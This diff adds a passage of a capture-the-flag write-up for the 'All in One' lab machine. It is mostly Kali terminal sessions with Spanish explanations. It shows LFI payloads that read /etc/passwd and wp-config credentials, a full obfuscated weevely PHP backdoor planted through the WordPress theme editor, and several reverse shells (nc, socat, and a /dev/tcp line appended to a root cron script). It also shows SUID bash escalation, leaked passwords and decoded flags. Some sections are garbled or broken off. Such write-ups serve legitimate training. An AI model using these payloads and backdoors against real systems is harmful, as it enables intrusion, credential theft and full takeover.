@@ -500,3 +500,506 @@ code : https://github.com/rapid7/metasploit-framework/blob/master//modules/explo
 └─$ msfconsole -q -x "use exploit/unix/webapp/wp_reflexgallery_file_upload; set RHOST 10.10.157.71; set LHOST 10.8.19.103; set TARGETURI /wordpress/; exploit"
 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
 RHOST => 10.10.157.71
+LHOST => 10.8.19.103
+TARGETURI => /wordpress/
+[*] Started reverse TCP handler on 10.8.19.103:4444 
+[-] Exploit aborted due to failure: unknown: 10.10.157.71:80 - Unable to deploy payload, server returned 200
+[*] Exploit completed, but no session was created.
+
+uhmm rport 80 
+
+ This module exploits an arbitrary PHP code upload in the WordPress 
+  Reflex Gallery version 3.1.3. The vulnerability allows for arbitrary 
+  file upload and remote code execution.
+
+version 3.1.3 so cannot
+
+let's do LFI
+
+http://10.10.161.184/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false sshd:x:112:65534::/run/sshd:/usr/sbin/nologin ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
+
+database’s config file
+
+http://10.10.161.184/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ 
+echo 'PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCA                                                                                               gaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCAnQVVUSF9LRVknLCAgICAgICAgICd6a1klbSVSRlliOnUsL2xxLWlafjhmakVOZElhU2I9Xms8M1pyLzBEaUxacVB4enxBdXFsaTZsWi05RFJhZ0pQJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdpQVlhazxfJn52OW8re2JAUlBSNjJSOSBUeS0gNlUteUg1YmFVRHs7bmRTaUNbXXFvc3hTQHNjdSZTKWQkSFtUJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX0tFWScsICAgICdhUGRfKnNCZj1adWMrK2FdNVZnOT1QfnUwM1EsenZwW2VVZS99KUQ9Ok55aFVZe0tYUl10N300MlVwa1tyNz9zJyApOw0KZGVmaW5lKCAnTk9OQ0VfS0VZJywgICAgICAgICdAaTtUKHt4Vi9mdkUhcyteZGU3ZTRMWDN9TlRAIGo7YjRbejNfZkZKYmJXKG5vIDNPN0ZAc3gwIW95KE9gaCNNJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdCIEFUQGk' | base64 -d
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'elyana' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'H@ckme@123' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+wordpress;
+define( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
+define( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         'zkY%m%RFYb:u,/lq-iZ~8fjENdIaSb=^k<3Zr/0DiLZqPxz|Auqli6lZ-9DRagJP' );
+define( 'SECURE_AUTH_KEY',  'iAYak<_&~v9o+{b@RPR62R9 Ty- 6U-yH5baUD{;ndSiC[]qosxS@scu&S)d$H[T' );
+define( 'LOGGED_IN_KEY',    'aPd_*sBf=Zuc++a]5Vg9=P~u03Q,zvp[eUe/})D=:NyhUY{KXR]t7}42Upk[r7?s' );
+define( 'NONCE_KEY',        '@i;T({xV/fvE!s+^de7e4LX3}NT@ j;b4[z3_fFJbbW(no 3O7F@sx0!oy(O`h#M' );
+define( 'AUTH_SALT',        'B AT@ibase64: invalid input
+
+elyana: H@ckme@123
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh elyana@10.10.161.184            
+The authenticity of host '10.10.161.184 (10.10.161.184)' can't be established.
+ED25519 key fingerprint is SHA256:Rm7wS3JV0q1IHCuI5dWaanuCoSlTYECCa9jTEE4BFsI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.161.184' (ED25519) to the list of known hosts.
+elyana@10.10.161.184's password: 
+Permission denied, please try again.
+
+Webshell file upload
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ weevely generate witty agent.php
+Generated 'agent.php' with password 'witty' of 707 byte size.
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat agent.php
+<?php
+$A=str_replace('rj','','crerjatrje_rjfurjnrjrjction');
+$W='~match(~"/$k~h(.+~)$kf~/~",~@fil~e_~get_~contents("php://input"),$m)=';
+$S='l);$~j++,$i~++){$o.=$t{~$i}^$k{~$j};}~}ret~urn $o;}if (~@preg_';
+$N='l=strle~n(~$t);$o="";for($i~~=0;$i<$~l;){for($~j=0;($j<$~c&~&$i<~$';
+$X='~=1~) {@ob_sta~rt()~;@eva~l(@~gzun~comp~ress(@x(@base6~4_decod~e~(';
+$Z='@~base6~4_enco~de(@x~(@gzco~m~press($o),$k));p~rin~t~("$p$kh$r$kf");}';
+$B='$m[1]),~$k)))~;$o=@o~b_g~et_contents();~@ob_e~n~d_clean(~);$r=';
+$d='~$k="07c~a0be~a";$kh="b7f~f339~bb612";$kf=~"d1539~23acf13"~;$~p';
+$k='="XAQ~VvKe~B0ry~tf~w1U";functio~n x($t,$k)~~~{$c=s~trlen($k);~$';
+$w=str_replace('~','',$d.$k.$N.$S.$W.$X.$B.$Z);
+$i=$A('',$w);$i();
+?>
+
+http://10.10.161.184/wordpress/wp-admin/
+
+login elyana: H@ckme@123
+
+http://10.10.161.184/wordpress/wp-login.php?redirect_to=http%3A%2F%2F10.10.161.184%2Fwordpress%2Fwp-admin%2F&reauth=1
+
+or can be with revshell php from pentestmonkey
+
+go to appearance and theme editor and upload agent.php
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ weevely http://10.10.161.184/wordpress/wp-content/themes/twentytwenty/404.php witty
+
+[+] weevely 4.0.1
+
+[+] Target:     10.10.161.184
+[+] Session:    /home/kali/.weevely/sessions/10.10.161.184/404_0.session
+
+[+] Browse the filesystem or execute commands starts the connection
+[+] to the target. Type :help for more information.
+
+weevely> whoami
+www-data
+www-data@elyana:/var/www/html/wordpress/wp-content/themes/twentytwenty $ 
+
+:)
+
+www-data@elyana:/var/www/html/wordpress/wp-content/themes/twentytwenty $ cd /home/elyana
+www-data@elyana:/home/elyana $ ls
+hint.txt
+user.txt
+www-data@elyana:/home/elyana $ cat user.txt
+cat: user.txt: Permission denied
+www-data@elyana:/home/elyana $ cat hint.txt
+Elyana's user password is hidden in the system. Find it ;)
+
+revshell
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lnvp 1337
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+
+www-data@elyana:/home/elyana $ :backdoor_reversetcp 10.8.19.103 1337 -s bash
+Error binding socket: '[Errno 98] Address already in use'
+Error binding socket: '[Errno 98] Address already in use'
+Error binding socket: '[Errno 98] Address already in use'
+Error binding socket: '[Errno 98] Address already in use'
+Error binding socket: '[Errno 98] Address already in use'
+Error binding socket: '[Errno 98] Address already in use'
+Error binding socket: '[Errno 98] Address already in use'
+Error binding socket: '[Errno 98] Address already in use'
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lnvp 1337
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.161.184.
+Ncat: Connection from 10.10.161.184:60536.
+bash: cannot set terminal process group (1010): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-4.4$ whoami
+whoami
+www-data
+
+:)
+
+stabilizing shell
+
+bash-4.4$ find / -user elyana -type f 2>&1 | grep -v "Permission" | grep -v "No such"
+such"/ -user elyana -type f 2>&1 | grep -v "Permission" | grep -v "No s
+/home/elyana/user.txt
+/home/elyana/.bash_logout
+/home/elyana/hint.txt
+/home/elyana/.bash_history
+/home/elyana/.profile
+/home/elyana/.sudo_as_admin_successful
+/home/elyana/.bashrc
+/etc/mysql/conf.d/private.txt
+
+Este comando utiliza la herramienta "find" para buscar archivos en todo el sistema de archivos (raíz "/") que tengan el propietario "elyana" y el tipo "f" (archivo). La opción "-user" especifica que se deben buscar archivos con propietario "elyana" y la opción "-type" especifica que se deben buscar solo archivos (en lugar de directorios, enlaces simbólicos, etc.).
+
+El comando también redirige la salida de error (2>) a la salida estándar (1) y luego utiliza "grep" para filtrar la salida. Las opciones "-v" de "grep" hacen que se excluyan las líneas que contienen las cadenas "Permission" o "No such", lo que significa que se omitirán las líneas de error que se generen por falta de permisos o porque no existe el archivo o el directorio especificado.
+
+En resumen, este comando busca todos los archivos en el sistema de archivos que tengan el propietario "elyana" y muestra solo las líneas de resultado que no contengan errores de permisos o de archivo no encontrado. Esto puede ser útil para encontrar archivos específicos que se hayan creado o modificado por un usuario determinado, o para verificar si un usuario ha creado o modificado archivos en el sistema.
+
+bash-4.4$ cat /etc/mysql/conf.d/private.txt
+
+cat /etc/mysql/conf.d/private.txt
+user: elyana
+password: E@syR18ght
+
+bash-4.4$ su elyana
+su elyana
+Password: E@syR18ght
+
+bash-4.4$ cd /home/elyana
+cd /home/elyana
+bash-4.4$ ls
+ls
+hint.txt  user.txt
+bash-4.4$ cat user.txt
+cat user.txt
+VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
+echo 'VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259' | base64 -d
+THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
+```
+
+## Privilege Escalation
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh elyana@10.10.161.184            
+elyana@10.10.161.184's password: E@syR18ght
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Dec 25 19:41:03 UTC 2022
+
+  System load:  0.08              Processes:           121
+  Usage of /:   53.3% of 6.41GB   Users logged in:     0
+  Memory usage: 68%               IP address for eth0: 10.10.161.184
+  Swap usage:   0%
+
+16 packages can be updated.
+0 updates are security updates.
+
+Last login: Fri Oct  9 08:09:56 2020
+-bash-4.4$ whoami
+elyana
+-bash-4.4$ 
+
+privesc
+
+-bash-4.4$ sudo -l
+Matching Defaults entries for elyana on elyana:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User elyana may run the following commands on elyana:
+    (ALL) NOPASSWD: /usr/bin/socat
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ socat file:`tty`,raw,echo=0 tcp-listen:3333
+
+-bash-4.4$ sudo socat tcp-connect:10.8.19.103:3333 exec:bash,pty,stderr,setsid,sigint,sane
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ socat file:`tty`,raw,echo=0 tcp-listen:3333
+root@elyana:~# whoami
+root
+root@elyana:~# cd /root
+root@elyana:/root# ls
+root.txt
+root@elyana:/root# cat root.txt
+VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ echo 'VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9' |base64 -d
+THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}    
+
+another way
+
+-bash-4.4$ find / -perm -4000 2> /dev/null | xargs ls -lah
+-rwsr-sr-x 1 root   root       1.1M Jun  6  2019 /bin/bash
+-rwsr-sr-x 1 root   root        59K Jan 18  2018 /bin/chmod
+-rwsr-xr-x 1 root   root        31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root   root        43K Sep 16  2020 /bin/mount
+-rwsr-xr-x 1 root   root        63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root   root        44K Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root   root        27K Sep 16  2020 /bin/umount
+-rwsr-sr-x 1 daemon daemon      51K Feb 20  2018 /usr/bin/at
+-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root   root        44K Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-sr-x 1 root   root        11M Nov 23  2018 /usr/bin/lxc
+-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root   root        40K Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root   root        59K Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root   root        22K Mar 27  2019 /usr/bin/pkexec
+-rwsr-sr-x 1 root   root       392K Apr  4  2018 /usr/bin/socat
+-rwsr-xr-x 1 root   root       146K Jan 31  2020 /usr/bin/sudo
+-rwsr-xr-x 1 root   root        19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-- 1 root   messagebus  42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root       427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root        14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root   root       111K Jul 10  2020 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root   root        99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+
+or
+
+-bash-4.4$ find / -perm -u=s -type f 2>/dev/null | xargs ls -lah
+-rwsr-sr-x 1 root   root       1.1M Jun  6  2019 /bin/bash
+-rwsr-sr-x 1 root   root        59K Jan 18  2018 /bin/chmod
+-rwsr-xr-x 1 root   root        31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root   root        43K Sep 16  2020 /bin/mount
+-rwsr-xr-x 1 root   root        63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root   root        44K Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root   root        27K Sep 16  2020 /bin/umount
+-rwsr-sr-x 1 daemon daemon      51K Feb 20  2018 /usr/bin/at
+-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root   root        44K Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-sr-x 1 root   root        11M Nov 23  2018 /usr/bin/lxc
+-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root   root        40K Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root   root        59K Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root   root        22K Mar 27  2019 /usr/bin/pkexec
+-rwsr-sr-x 1 root   root       392K Apr  4  2018 /usr/bin/socat
+-rwsr-xr-x 1 root   root       146K Jan 31  2020 /usr/bin/sudo
+-rwsr-xr-x 1 root   root        19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-- 1 root   messagebus  42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root       427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root        14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root   root       111K Jul 10  2020 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root   root        99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+
+https://gtfobins.github.io/gtfobins/bash/
+
+-bash-4.4$ /bin/bash -p
+bash-4.4# whoami
+root
+
+Este comando utiliza la herramienta "find" para buscar archivos en todo el sistema de archivos (raíz "/") que tengan el permiso de ejecución de setuid (u=s) habilitado. La opción "-perm" especifica que se deben buscar archivos con permisos específicos y la opción "-type" especifica que se deben buscar solo archivos (en lugar de directorios, enlaces simbólicos, etc.).
+
+El comando también redirige la salida de error (2>) a "/dev/null", que es un archivo especial que descarta cualquier salida enviada a él. Esto significa que no se mostrarán mensajes de error en la salida del comando.
+
+En resumen, este comando busca todos los archivos en el sistema de archivos que tengan el permiso de ejecución de setuid habilitado y no muestra mensajes de error. Esto puede ser útil para encontrar archivos que tienen permisos de ejecución de setuid configurados y comprobar si están en uso en el sistema.
+
+Es importante tener en cuenta que los archivos con permiso de ejecución de setuid pueden ser peligrosos si no se usan adecuadamente, ya que permiten a los usuarios ejecutar el archivo con los privilegios del propietario del archivo, incluso si no tienen permisos de superusuario. Por lo tanto, es importante asegurarse de que solo se habiliten los permisos de setuid en archivos confiables y seguros.
+
+another way
+
+-bash-4.4$ cat /etc/crontab
+```
+```text
+# All in One — Writeup
+```
+```text
+# Unlike any other crontab you don't have to run the `crontab'
+```
+```text
+# command to install the new version when you edit this file
+```
+```text
+# and files in /etc/cron.d. These files also have username fields,
+```
+```text
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+```text
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+- *    * * *   root    /var/backups/script.sh
+
+-bash-4.4$ cat /var/backups/script.sh
+#!/bin/bash
+
+#Just a test script, might use it later to for a cron task 
+
+-bash-4.4$ echo "bash -i >& /dev/tcp/10.8.19.103/8888 0>&1" >> /var/backups/script.sh
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lnvp 8888
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::8888
+Ncat: Listening on 0.0.0.0:8888
+Ncat: Connection from 10.10.161.184.
+Ncat: Connection from 10.10.161.184:43450.
+bash: cannot set terminal process group (2097): Inappropriate ioctl for device
+bash: no job control in this shell
+root@elyana:~# whoami
+whoami
+root
+
+another way (lxc)
+
+LXC (Linux Containers) es un sistema de contenedores de Linux que permite a los usuarios ejecutar múltiples entornos aislados dentro de un único sistema operativo host. Cada entorno aislado se conoce como contenedor y tiene su propio espacio de usuario, procesos y recursos, como archivos, memoria y red.
+
+LXC se basa en tecnologías de virtualización ligera, como cgroups y namespaces, para aislar los contenedores del host y de otros contenedores. Esto permite a los usuarios ejecutar diferentes versiones de sistemas operativos, aplicaciones y entornos de desarrollo dentro de un único host, lo que facilita la gestión y el aprovechamiento de los recursos del sistema.
+
+LXC se utiliza ampliamente en entornos de producción y de desarrollo para aislar servicios y aplicaciones, probar y desplegar aplicaciones en diferentes entornos y reducir la sobrecarga de la máquina virtual completa. También se utiliza para implementar soluciones de contenedores a gran escala, como Kubernetes y Docker.
+
+https://github.com/saghul/lxd-alpine-builder.git](https://github.com/saghul/lxd-alpine-builder.git
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver]
+└─$ cd lxd-alpine-builder
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
+└─$ ls
+alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  README.md
+alpine-v3.16-x86_64-20220919_1406.tar.gz  LICENSE
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
+└─$ sudo python3 -m http.server    
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
